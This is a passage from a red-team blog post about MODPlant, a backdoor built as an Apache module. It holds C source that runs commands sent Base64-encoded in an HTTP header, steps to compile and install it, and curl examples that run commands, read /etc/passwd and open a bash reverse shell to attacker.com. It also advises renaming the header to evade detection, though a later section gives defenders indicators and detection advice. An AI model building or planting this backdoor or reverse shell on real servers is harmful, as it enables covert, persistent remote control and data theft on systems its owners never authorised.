</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Capture command output
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">8192</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">size_t</span> total_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">size_t</span> cap <span style="color:#f92672">=</span> <span style="color:#ae81ff">8192</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>output <span style="color:#f92672">=</span> <span style="color:#a6e22e">apr_pcalloc</span>(r<span style="color:#f92672">-&gt;</span>pool, cap);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">fgets</span>(buffer, <span style="color:#66d9ef">sizeof</span>(buffer), fp)) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">size_t</span> blen <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(buffer);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (total_len <span style="color:#f92672">+</span> blen <span style="color:#f92672">&gt;=</span> cap) {
</span></span><span style="display:flex;"><span>            cap <span style="color:#f92672">*=</span> <span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>newbuf <span style="color:#f92672">=</span> <span style="color:#a6e22e">apr_palloc</span>(r<span style="color:#f92672">-&gt;</span>pool, cap);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">memcpy</span>(newbuf, output, total_len);
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">=</span> newbuf;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memcpy</span>(output <span style="color:#f92672">+</span> total_len, buffer, blen);
</span></span><span style="display:flex;"><span>        total_len <span style="color:#f92672">+=</span> blen;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pclose</span>(fp);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Encode and return output
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>encoded <span style="color:#f92672">=</span> <span style="color:#a6e22e">b64encode</span>(r<span style="color:#f92672">-&gt;</span>pool, output, total_len);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ap_rputs</span>(encoded, r);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> OK;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h4 id="module-registration">Module Registration<a hidden class="anchor" aria-hidden="true" href="#module-registration">#</a></h4>
<p>Finally, we register our hook with Apache:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">register_hooks</span>(<span style="color:#66d9ef">apr_pool_t</span> <span style="color:#f92672">*</span>p)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ap_hook_header_parser</span>(admin_exec_hook, NULL, NULL, APR_HOOK_MIDDLE);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>module AP_MODULE_DECLARE_DATA admin_exec_module <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    STANDARD20_MODULE_STUFF,
</span></span><span style="display:flex;"><span>    NULL, NULL, NULL, NULL,
</span></span><span style="display:flex;"><span>    NULL,
</span></span><span style="display:flex;"><span>    register_hooks
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p>I called this whole project MODPlant, and deployed it in Github, you may download it <a href="https://github.com/s0ld13rr/MODPlant">here</a>.</p>
<h2 id="proof-of-concept-exploitation">Proof of Concept Exploitation<a hidden class="anchor" aria-hidden="true" href="#proof-of-concept-exploitation">#</a></h2>
<h3 id="prerequisites-installation">Prerequisites Installation<a hidden class="anchor" aria-hidden="true" href="#prerequisites-installation">#</a></h3>
<p>First of all, install the Apache development tools required for module compilation:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt update
</span></span><span style="display:flex;"><span>sudo apt install apache2-dev -y
</span></span></code></pre></div><p>This installs the <code>apxs</code> (Apache Extension Tool) utility, which is essential for building and installing Apache modules.</p>
<h3 id="module-compilation-and-installation">Module Compilation and Installation<a hidden class="anchor" aria-hidden="true" href="#module-compilation-and-installation">#</a></h3>
<p><img alt="MODPlant Install" loading="lazy" src="http://localhost:1313/modplant_install.png"></p>
<p>Compile and install the module with a single command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apxs -i -a -c mod_shell.c
</span></span></code></pre></div><p>This command performs three critical operations:</p>
<ol>
<li><strong>Compilation</strong>: Converts our C source code into a <code>.so</code> (shared object) library</li>
<li><strong>Installation</strong>: Copies the compiled module to Apache&rsquo;s module directory</li>
<li><strong>Configuration</strong>: Automatically adds a <code>LoadModule</code> directive to Apache&rsquo;s configuration</li>
</ol>
<h3 id="service-restart">Service Restart<a hidden class="anchor" aria-hidden="true" href="#service-restart">#</a></h3>
<p><img alt="Apache Service" loading="lazy" src="http://localhost:1313/apache-service-check.png"></p>
<p>After executing the <code>apxs</code> command, Apache needs to be restarted to load the new module:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo systemctl restart apache2
</span></span></code></pre></div><p>Verify the service is running correctly:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo systemctl status apache2
</span></span></code></pre></div><h3 id="testing-the-backdoor">Testing the Backdoor<a hidden class="anchor" aria-hidden="true" href="#testing-the-backdoor">#</a></h3>
<p><img alt="PoC Execution" loading="lazy" src="http://localhost:1313/modplant-poc-exec.png"></p>
<p>Now we can interact with our backdoor. Commands are sent Base64-encoded via the <code>X-Request-ID</code> HTTP header. The header name can be modified in <code>mod_shell.c</code> to avoid detection.</p>
<p>Example using curl:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Encode command: echo &#34;whoami&#34; | base64</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Result: d2hvYW1p</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#34;X-Request-ID: d2hvYW1p&#34;</span> http://target-server.com/
</span></span></code></pre></div><p>The server responds with Base64-encoded output: <code>d3d3LWRhdGE=</code></p>
<h3 id="decoding-the-response">Decoding the Response<a hidden class="anchor" aria-hidden="true" href="#decoding-the-response">#</a></h3>
<p><img alt="Decode Command Output" loading="lazy" src="http://localhost:1313/modplant-command-output.png"></p>
<p>Decode the server&rsquo;s response to view command output:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;d3d3LWRhdGE=&#34;</span> | base64 -d
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Output: www-data</span>
</span></span></code></pre></div><p>This demonstrates successful command execution with full output exfiltration. The Base64 encoding provides several benefits:</p>
<ul>
<li>Obfuscates command content from casual log inspection</li>
<li>Handles binary data and special characters safely</li>
<li>Maintains compatibility with HTTP protocol requirements</li>
</ul>
<h3 id="advanced-usage-examples">Advanced Usage Examples<a hidden class="anchor" aria-hidden="true" href="#advanced-usage-examples">#</a></h3>
<p><strong>File enumeration:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Command: ls -la /etc/passwd</span>
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;bHMgLWxhIC9ldGMvcGFzc3dk&#34;</span> | base64
</span></span><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#34;X-Request-ID: bHMgLWxhIC9ldGMvcGFzc3dk&#34;</span> http://target/
</span></span></code></pre></div><p>But, you also supposed to ensure the proper access for the user by which the apache service is running, in my case <code>www-data</code> default user does not have those excessive privileges, but it is also the vector for backdooring the target server.</p>
<p><strong>Reverse shell establishment:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Command: bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1</span>
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx&#34;</span> | base64
</span></span><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#34;X-Request-ID: YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx&#34;</span> http://target/
</span></span></code></pre></div><h2 id="detection-and-hunting-perspective">Detection and Hunting Perspective<a hidden class="anchor" aria-hidden="true" href="#detection-and-hunting-perspective">#</a></h2>
<h3 id="indicators-of-attack-ioa">Indicators of Attack (IOA)<a hidden class="anchor" aria-hidden="true" href="#indicators-of-attack-ioa">#</a></h3>
<p>Defenders should monitor for the following suspicious activities:</p>
<h4 id="1-suspicious-apxs-execution">1. Suspicious <code>apxs</code> Execution<a hidden class="anchor" aria-hidden="true" href="#1-suspicious-apxs-execution">#</a></h4>
<p>The <code>apxs</code> tool is rarely used in production environments outside of initial server setup. Monitor process execution logs for:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Detection via Sysmon or auditd</span>
</span></span><span style="display:flex;"><span>apxs -i -a -c *.c
</span></span></code></pre></div><p><strong>Detection logic:</strong></p>
<ul>
<li>Unusual parent processes spawning <code>apxs</code></li>
<li><code>apxs</code> execution by non-administrative users</li>
<li>Compilation of <code>.c</code> files in unexpected directories (e.g., <code>/tmp</code>, <code>/var/www</code>)</li>
</ul>
<h4 id="2-apache-service-restarts">2. Apache Service Restarts<a hidden class="anchor" aria-hidden="true" href="#2-apache-service-restarts">#</a></h4>
<p>Unexpected Apache service restarts, especially outside maintenance windows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>systemctl restart apache2
</span></span><span style="display:flex;"><span>service apache2 restart
</span></span><span style="display:flex;"><span>/etc/init.d/apache2 restart
</span></span></code></pre></div><p><strong>Monitoring points:</strong></p>
<ul>
<li>Correlate service restarts with user activity</li>
<li>Alert on restarts without corresponding change tickets</li>
<li>Track which user initiated the restart</li>
</ul>
<h4 id="3-file-system-artifacts">3. File System Artifacts<a hidden class="anchor" aria-hidden="true" href="#3-file-system-artifacts">#</a></h4>
<p>Monitor critical Apache directories for new or modified files:</p>
<p><strong>Module configuration:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/etc/apache2/mods-available/*.load
</span></span><span style="display:flex;"><span>/etc/apache2/mods-enabled/*.load
</span></span></code></pre></div><p><strong>Compiled modules:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/lib/apache2/modules/*.so
</span></span></code></pre></div><p><strong>Detection strategy:</strong></p>
<ul>
<li>Baseline legitimate modules during system provisioning</li>
<li>Alert on new <code>.so</code> files with recent creation timestamps</li>
<li>Check module file signatures against known-good hashes</li>
<li>Inspect <code>.load</code> files for suspicious module names</li>
</ul>
<h4 id="4-behavioral-anomalies">4. Behavioral Anomalies<a hidden class="anchor" aria-hidden="true" href="#4-behavioral-anomalies">#</a></h4>
<p><strong>Network indicators:</strong></p>
<ul>
<li>Unusual outbound connections from Apache process</li>
<li>HTTP requests with suspicious custom headers (e.g., <code>X-Request-ID</code> with long Base64 strings)</li>
<li>Consistent Base64-encoded responses in HTTP traffic</li>
</ul>
<h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
<p>Apache module-based backdoors represent a sophisticated persistence technique that combines stealth, flexibility, and resilience. By operating at the web server process level rather than as traditional webshells, these backdoors evade many common detection mechanisms.</p>
<h3 id="key-takeaways">Key Takeaways<a hidden class="anchor" aria-hidden="true" href="#key-takeaways">#</a></h3>
<p><strong>For Red Teams:</strong></p>
<ul>
<li>Apache modules provide excellent persistence in authorized assessments</li>
<li>The technique demonstrates the importance of defense-in-depth</li>
<li>Custom headers and Base64 encoding add layers of obfuscation</li>
<li>Consider operational security: module names, header names, and compilation artifacts all create detection opportunities</li>
</ul>
<p><strong>For Blue Teams:</strong></p>
<ul>
<li>Traditional webshell detection methods are insufficient against module-based backdoors</li>
<li>File integrity monitoring and behavioral analysis are critical</li>
<li>Baseline your environment to detect anomalous module installations</li>
<li>Process execution monitoring can catch compilation activities</li>
<li>Network traffic analysis can identify suspicious Base64-encoded communications</li>
</ul>
<h3 id="future-research-directions">Future Research Directions<a hidden class="anchor" aria-hidden="true" href="#future-research-directions">#</a></h3>
<p>This technique can be extended further:</p>
<ul>
<li><strong>Memory-only operation</strong>: Loading modules without disk persistence</li>
<li><strong>Encrypted communications</strong>: Replacing Base64 with AES encryption</li>
<li><strong>Polymorphic modules</strong>: Generating unique module signatures per deployment</li>
<li><strong>Multi-protocol support</strong>: Extending beyond HTTP to HTTPS, WebSockets, HTTP/2</li>
<li><strong>Anti-forensics</strong>: Implementing self-deletion and log manipulation capabilities</li>
</ul>
<p>The arms race between attackers and defenders continues. Understanding these advanced persistence techniques is essential for both offensive security practitioners and defensive teams. As with all security research, use this knowledge responsibly and only in authorized contexts.</p>
<h3 id="references">References<a hidden class="anchor" aria-hidden="true" href="#references">#</a></h3>
<ul>
<li><a href="https://cicada-8.medium.com/from-http-to-rce-how-to-leave-backdoor-in-iis-cbef8249eba9">From HTTP to RCE. How to leave backdoor in IIS</a></li>
<li><a href="https://www.tarlogic.com/blog/backdoors-modules-apache/">Backdoors in XAMP stack (part III): Apache Modules</a></li>
<li><a href="https://www.welivesecurity.com/2012/12/20/malicious-apache-module-a-clarification/">Malicious Apache Module: a clarification</a></li>
<li><a href="https://httpd.apache.org/docs/2.4/developer/modguide.html">Developing modules for the Apache HTTP Server 2.4</a></li>
</ul>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/backdoor/">Backdoor</a></li>
      <li><a href="http://localhost:1313/tags/apache/">Apache</a></li>
      <li><a href="http://localhost:1313/tags/persistence/">Persistence</a></li>
      <li><a href="http://localhost:1313/tags/red-team/">Red-Team</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="http://localhost:1313/">s0ld13r&#39;s blog</a></span> ¬∑ 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
